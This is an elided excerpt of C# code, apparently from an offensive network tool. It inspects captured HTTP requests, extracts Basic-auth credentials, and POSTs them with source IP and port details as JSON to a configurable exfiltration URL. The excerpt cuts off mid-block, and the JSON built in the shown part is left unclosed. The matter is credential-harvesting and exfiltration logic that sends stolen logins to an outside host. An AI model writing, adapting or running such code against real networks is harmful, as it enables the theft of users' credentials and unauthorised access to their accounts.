                ...
                try
                {
                    ...
                    if (!String.IsNullOrEmpty(httpRequest) && (httpRequest.StartsWith("47-45-54-20") || httpRequest.StartsWith("48-45-41-44-20") || httpRequest.StartsWith("4F-50-54-49-4F-4E-53-20") || httpRequest.StartsWith("43-4F-4E-4E-45-43-54-20") || httpRequest.StartsWith("50-4F-53-54-20")))
                    {
                        ...
                        else if (httpHeaderAuthorization.ToUpper().StartsWith("BASIC "))
                        {
                            ...
                            if (!String.IsNullOrEmpty(Program.argExfilUrl))
                            {
                                try
                                {
                                    var msg = "{"; 
                                    if (!String.IsNullOrEmpty(httpType))
                                    { msg += "\"httpType\": \"" + httpType + "\","; }
                                    if (!String.IsNullOrEmpty(httpPort))
                                    { msg += "\"httpPort\": \"" + httpPort + "\","; }
                                    if (!String.IsNullOrEmpty(httpSourceIP))
                                    { msg += "\"httpSourceIP\": \"" + httpSourceIP + "\","; }
                                    if (!String.IsNullOrEmpty(httpSourcePort))
                                    { msg += "\"httpSourcePort\": \"" + httpSourcePort + "\","; }
                                    if (!String.IsNullOrEmpty(cleartextCredentials))
                                    { msg += "\"cleartextCredentials\": \"" + cleartextCredentials + "\","; }

                                    var httpWebRequest = WebRequest.CreateHttp(Program.argExfilUrl);
                                    httpWebRequest.ContentType = "application/json; charset=utf-8";
                                    httpWebRequest.Method = "POST";         
                                    httpWebRequest.ContentLength = msg.Length;
                                    using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                                    {
                                        streamWriter.Write(msg);
                                        streamWriter.Flush();
                                    }
                                    var hResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                                    using (var streamReader = new StreamReader(hResponse.GetResponseStream()))
                                    {
